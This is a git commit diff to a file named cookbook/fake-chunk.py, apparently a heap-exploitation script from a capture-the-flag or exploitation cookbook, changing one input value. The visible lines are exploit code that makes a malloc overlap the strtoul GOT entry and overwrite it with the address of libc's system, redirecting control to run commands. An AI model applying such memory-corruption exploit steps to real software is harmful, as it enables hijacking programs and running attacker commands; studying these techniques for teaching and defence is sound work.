877f6b4041a1e2a31bb0333badf8856a71df154f
Kichang Yang <kichangya@gmail.com>
2017-09-13 19:42:37 -0700

    .

--- cookbook/fake-chunk.py
+++ cookbook/fake-chunk.py
@@ -159,7 +159,7 @@ if __name__ == '__main__':
     s('X')
 
     s('g')
-    s('0x8') # this malloc will overlap with strtoul@got
+    s('0x5') # this malloc will overlap with strtoul@got
     s(p32(LIBC_BASE+SYSTEM_OFFSET))  # overwrite, now strtoul == system
 
     s('g')
